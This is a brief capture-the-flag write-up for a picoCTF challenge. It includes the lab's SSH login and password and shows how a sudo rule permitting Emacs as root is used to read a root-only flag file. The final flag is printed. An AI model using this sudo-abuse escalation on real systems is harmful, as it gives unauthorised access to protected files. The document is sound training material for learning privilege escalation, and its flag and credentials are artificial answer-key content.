--------------------------------------------------------------------------------------------------------------
"
Can you read the flag? I think you can!

ssh -p 53351 ctf-player@green-hill.picoctf.net using password 430838f7
"
--------------------------------------------------------------------------------------------------------------


# first we need to login ssh

ssh -p 53351 ctf-player@green-hill.picoctf.net

    430838f7

ls

ls -lh flag.txt

# this shows that only root can read the file

# so let's check the sudo permissions

sudo -l

>> User ctf-player may run the following commands on challenge: (ALL) 
>> NOPASSWD: /bin/emacs

# this means the user can run Emacs as root without a password

sudo emacs flag.txt

>> picoCTF{ju57_5ud0_17_c2c0d2e2}
